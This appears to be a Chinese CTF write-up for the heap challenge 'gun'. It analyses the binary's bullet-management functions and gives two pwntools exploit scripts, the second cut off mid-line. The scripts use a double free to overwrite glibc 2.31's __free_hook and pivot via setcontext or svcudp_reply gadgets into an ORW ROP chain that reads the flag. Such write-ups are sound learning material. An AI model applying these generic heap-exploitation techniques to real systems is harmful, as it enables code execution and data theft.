title="程序分析"></a>程序分析</h2><p>整个程序主要考察堆利用，由三个功能构成，购买子弹，上膛子弹，射击子弹。</p><ul><li><p>购买子弹首先会根据从小到大寻找一个对应flag为0的idx，然后malloc一个用户指定大小的chunk(0x10~0x500)，且所有堆块的用户区域大小不能超过一定数值。此外该子弹的flag设置为1，同时有一次向chunk写数据的机会，购买的子弹会通过一个18字节大小的数据结构管理。chunk指向分配的堆块，next用于在上膛状态指向下一个子弹，flag是标志位分别有0，1，2，表示不同的状态。只能同时有14个子弹。</p>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">struct</span>&#123;<br><span class="hljs-type">char</span>* chunk;<br><span class="hljs-type">char</span>* next;<br><span class="hljs-type">int</span> flag;  <span class="hljs-comment">// 0为发射之后 1为购买状态 2为上膛状态</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>上膛子弹会先检查压入子弹的idx是否小于等于13和对应flag是否是1，然后才把子弹放进弹夹中，如果弹夹中已经有子弹，则会使用next进行链接，next指向上一次压入弹夹中的子弹，然后把这个子弹放进弹夹中，构成一个由子弹组成的单向链表，最后改变子弹标志位为2。</p></li><li><p>发射子弹会先指定射击次数，然后从弹夹中的子弹（单链表表头）开始free，直到达到指定次数，子弹射击结束后会设置相应的flag为0。每次射击之前会输出这个子弹的chunk内容，这给了我们泄露的机会。free时没有检查flag。</p></li><li><p>自定义的输入函数myread：当输入字节数超过约定大小和遇到<code>\n</code>时立即结束输入，并且不会将<code>\n</code>写入指定内存，因此payload中需要避免有<code>\x0a</code>字节，此外我们申请一个chunk之后可以实现不往chunk中写入数据（只发送一个<code>\n</code>）</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sqf">unsigned <span class="hljs-variable">__int64</span> <span class="hljs-variable">__fastcall</span> myread(<span class="hljs-variable">__int64</span> addr, unsigned <span class="hljs-variable">__int64</span> <span class="hljs-built_in">size</span>)<br>&#123;<br>  unsigned <span class="hljs-variable">__int64</span> result; <span class="hljs-comment">// rax</span><br>  unsigned <span class="hljs-variable">__int8</span> buf; <span class="hljs-comment">// [rsp+17h] [rbp-9h] BYREF</span><br>  unsigned <span class="hljs-variable">__int64</span> i; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>LL; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-built_in">size</span> )<br>      <span class="hljs-built_in">break</span>;<br>    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>uLL);<br>    result = buf;<br>    <span class="hljs-keyword">if</span> ( buf == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-built_in">break</span>;<br>    *(<span class="hljs-variable">_BYTE</span> *)(i + addr) = buf;<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li><p>泄露heap：首先申请两个相同大小堆块，然后依次释放进入tcache中，然后再次申请一个该大小的chunk，只输入一个字节即可，然后在释放它，查看释放时的输出即可。</p></li><li><p>泄露libc：首先申请一个超过tcache大小的chunk，然后释放，再申请一个小chunk，不输入字节，使其<code>fd</code>和<code>bk</code>的数据是<code>main_arena+offset</code>，最后通过释放时输出堆块内容来泄露libc。</p></li><li><p>任意地址写：通过构造<code>Double Free</code>实现任意地址写，就需要存在<code>UAF</code>漏洞，所以我们需要申请2个chunk(A和B)，首先单独释放A，然后再单独释放B，此时我们希望B释放之后再释放A，但是由于flag限制，无法再次上膛A，所以我们无法通过正常途径释放A。考虑到可以连续释放单链表中的堆块，并且chunk管理结构体中的next不会随chunk释放而置零，因此我们可以利用原有的next指针（指向A）再次释放A，从而实现<code>Double Free</code>。</p></li><li><p>获取flag：由沙箱逻辑可知只能通过ORW来获取flag，利用<code>Double Free</code>修改<code>__free_hook</code>为一系列gadget即可。</p></li><li><p>gadget1：libc-2.31.so的setcontext从61处开始，并且由rdx决定而不是rdi，因此需要先找一个gadget（getkeyserv_handle+576，如下）来实现通过rdi控制rdx的值，然后再执行<code>setcontext+61</code>。通过<code>setcontext+61</code>在<code>__free_hook</code>处写入用于ORW的rop链。</p>  <figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>] <span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rsp</span>], <span class="hljs-built_in">rax</span> <span class="hljs-comment">; </span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdx</span> + <span class="hljs-number">0x20</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li><li><p>gadget2：利用<code>svcudp_reply+26</code>这个gadget和<code>leave;ret</code>指令进行栈迁移到堆中，在对上提前布置好ROP链即可。</p></li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">svcudp_reply+<span class="hljs-number">26</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0x48</span>]<span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">0x18</span>]<span class="hljs-comment">; </span><br><span class="hljs-keyword">lea</span> <span class="hljs-built_in">r13</span>, [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">0x10</span>]<span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rbp</span> + <span class="hljs-number">0x10</span>], <span class="hljs-number">0</span><span class="hljs-comment">; </span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdi</span>, <span class="hljs-built_in">r13</span><span class="hljs-comment">; </span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x28</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><h3 id="利用setcontext-61写入并执行ROP链"><a href="#利用setcontext-61写入并执行ROP链" class="headerlink" title="利用setcontext+61写入并执行ROP链"></a>利用setcontext+61写入并执行ROP链</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shoot</span>(<span class="hljs-params">times</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Shoot time: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(times).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which one do you want to load?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet price: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet Name: &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave_name</span>(<span class="hljs-params">name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your name: &quot;</span>)<br>    p.sendline(name)<br><br><br>leave_name(<span class="hljs-string">&quot;sh0ve1&quot;</span>)<br><br><span class="hljs-comment"># leak libc </span><br>buy(<span class="hljs-number">0x4c0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4c0</span>) <span class="hljs-comment">#0  0x4d0=0x70*0xb</span><br>buy(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>) <span class="hljs-comment"># unsorted bin</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><br>libc.address = (u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span>) - <span class="hljs-number">0x1ec000</span> <br>__free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>setcontext = libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>log.success(<span class="hljs-string">&quot;libcbase :&quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#6</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#9</span><br><br>load(<span class="hljs-number">0</span>)<br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;&#x27;</span>) <span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">&quot;The &quot;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x340</span><br>log.success(<span class="hljs-string">&quot;heapbase: &quot;</span> + <span class="hljs-built_in">hex</span>(heapbase))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;C&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2 此时idx=2的chunk的next_bullet依旧是idx=0</span><br><br><span class="hljs-comment"># 用idx=3~9的填满tcache</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    load(i+<span class="hljs-number">3</span>)<br>shoot(<span class="hljs-number">7</span>)<br><br><span class="hljs-comment"># 先将idx=0放入fastbin</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># load一次，射击两次，利用next_bullet来double free idx=0（连续射击时没有检查flag）</span><br>load(<span class="hljs-number">2</span>)<br>shoot(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># idx=0,2~7</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;D&#x27;</span>*<span class="hljs-number">0x60</span>)<br><br>buy(<span class="hljs-number">0x60</span>,p64(__free_hook)) <span class="hljs-comment">#8</span><br><br>str_flag = heapbase + <span class="hljs-number">0x340</span><br>frame_addr = heapbase + <span class="hljs-number">0x7c0</span> <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdx, dword ptr [rdi + 8] ; </span><br><span class="hljs-string">mov qword ptr [rsp], rax ; </span><br><span class="hljs-string">call qword ptr [rdx + 0x20];</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment"># way 1</span><br>gadget = libc.address + <span class="hljs-number">0x154930</span><br>frame = SigreturnFrame()<br>frame[<span class="hljs-string">&#x27;uc_stack.ss_size&#x27;</span>] = setcontext <span class="hljs-comment"># [rdx + 0x20]=[frame_addr + 0x20]</span><br>frame.rip = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] <span class="hljs-comment"># 实际先是rcx</span><br>frame.rdi = <span class="hljs-number">0</span><br>frame.rsi = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>frame.rdx = <span class="hljs-number">0x200</span><br>frame.rsp = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>) <span class="hljs-comment">#9 </span><br>buy(<span class="hljs-number">0x100</span>,<span class="hljs-built_in">bytes</span>(frame)) <span class="hljs-comment">#10</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;E&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#11</span><br>buy(<span class="hljs-number">0x60</span>,p64(gadget)) <span class="hljs-comment">#12 修改__free_hook为gadget</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(frame_addr) <span class="hljs-comment">#rdx=[rdi+8]</span><br><br>buy(<span class="hljs-number">0x60</span>,payload) <span class="hljs-comment">#13</span><br>rop = ROP(libc)<br>rop.<span class="hljs-built_in">open</span>(str_flag,<span class="hljs-number">0x4</span>)<br>rop.read(<span class="hljs-number">3</span>,str_flag,<span class="hljs-number">0x30</span>)<br>rop.write(<span class="hljs-number">1</span>,str_flag,<span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p,&quot;b *0x7ffff7f2a930&quot;)  #0x7ffff7f2a930 0x7ffff7e2e0dd</span><br>load(<span class="hljs-number">13</span>) <span class="hljs-comment"># trriger</span><br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># pause()</span><br>p.sendline(rop.chain())<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h3 id="利用svcudp-reply-26和leave-ret进行栈迁移"><a href="#利用svcudp-reply-26和leave-ret进行栈迁移" class="headerlink" title="利用svcudp_reply+26和leave;ret进行栈迁移"></a>利用svcudp_reply+26和leave;ret进行栈迁移</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./gun&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shoot</span>(<span class="hljs-params">times</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Shoot time: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(times).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Which one do you want to load?&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Action&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet price: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;Bullet Name: &quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leave_name</span>(<span class="hljs-params">name</span>):<br>    p.recvuntil(<span class="hljs-string">&quot;Your name: &quot;</span>)<br>    p.sendline(name)<br><br><br>leave_name(<span class="hljs-string">&quot;sh0ve1&quot;</span>)<br><br><span class="hljs-comment"># leak libc </span><br>buy(<span class="hljs-number">0x4c0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x4c0</span>) <span class="hljs-comment">#0  0x4d0=0x70*0xb</span><br>buy(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>) <span class="hljs-comment">#1</span><br><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>) <span class="hljs-comment"># unsorted bin</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;A&#x27;</span>)<span class="hljs-comment">#0</span><br>load(<span class="hljs-number">0</span>)<br>shoot(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># 为什么申请之后，fd和bk的值变了，不是main_arena+96</span><br>libc.address = (u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) &amp; <span class="hljs-number">0xfffffffff000</span>) - <span class="hljs-number">0x1ec000</span> <br>__free_hook = libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>svcudp_reply_26 = libc.address + <span class="hljs-number">0x157d70</span> + <span class="hljs-number">26</span> <span class="hljs-comment">#libc.sym[&#x27;svcudp_reply&#x27;]</span><br>log.success(<span class="hljs-string">&quot;libcbase :&quot;</span> + <span class="hljs-built_in">hex</span>(libc.address))<br><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#0</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#2</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#3</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#5</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#6</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#7</span><br>buy(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0x60</span>) <span class="hljs-comment">#8</span><br>buy(<span 